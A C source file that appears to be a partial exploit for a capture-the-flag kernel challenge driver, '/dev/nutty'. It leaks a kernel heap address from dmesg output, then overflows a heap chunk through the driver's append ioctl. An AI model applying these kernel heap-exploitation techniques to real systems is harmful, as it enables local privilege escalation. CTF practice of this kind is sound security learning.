#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <stdint.h>

#define CREATE 0x13371
#define DELETE 0x13372
#define SHOW 0x13373 
#define APPEND 0x13374

#define PAGE_SIZE 0x1000

int target_idx;
unsigned long long leak;
int fd;

typedef struct req {
    int idx;
    int size;
    char* contents;
    int content_length;
    char* show_buffer;
} req;

void open_device(){
    fd = open("/dev/nutty",O_RDWR);
    if(fd < 0){
        puts("[-] Failed to open nutty");
    }
    puts("[+] Opened nutty");
}

void add(int size, int content_length, char *contents){
    req r;
    r.size = size;
    r.contents = contents;
    r.content_length = content_length;
    printf("[+] sending contents -> %s\n",contents);
    int ret = ioctl(fd,CREATE,(unsigned long)&r);
    if(ret){
        perror("Something's wrong in Add");
        exit(-1);
    }
    puts("[+] Add ok!");
}

void delete(int idx){
    req r;
    r.idx = idx;
    int ret = ioctl(fd,DELETE,(unsigned long)&r);
    if(ret){
        perror("Something's wrong in delete");
        exit(-1);
    }
    puts("[+] Delete ok!");
}

void show(int idx,char* show_buffer){
    req r;
    r.idx = idx;
    r.show_buffer = show_buffer;
    int ret = ioctl(fd,SHOW,(unsigned long)&r);
    if(ret){
        perror("Something's wrong in show");
        exit(-1);
    }
    puts("[+] Show ok!");
}

void append(int idx,int size, char* contents){
    req r;
    r.idx = idx;
    r.size = size;
    r.contents = contents;
    int ret = ioctl(fd,APPEND,(unsigned long)&r);
    if(ret){
        perror("Something's wrong in append");
        exit(-1);
    }
    puts("[+] Append ok!");
}

void get_heap(){
    char buf[0xc0];
    char leak_buf[0xc0] = {'\x00'};
    memset(buf,0x61,sizeof(buf));
    add(0xc0,sizeof(buf),buf);
    add(0xc0,sizeof(buf),buf);
    delete(0);
    delete(1);
    FILE* fp = popen("/bin/dmesg | tail -1 | awk '{print $5}'","r");
    if(!fp){
        perror("[+] Failed to exec dmesg");
        exit(-1);
    }
    while(fgets(leak_buf,sizeof(leak_buf),fp)!=NULL){
        char *ptr;
        leak = strtoull(leak_buf,&ptr,16);
        printf("Leak heap -> %llx\n",leak);
    }
    pclose(fp);
}


int main(){
    open_device();
    get_heap();
    char buf[] = "aaaaaaaaaaaaaaaaaa";
    add(76, 76, buf);
    char new_buf[]= "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    append(0,1025,new_buf);
    add(76, 76, buf);
    return 0;
}
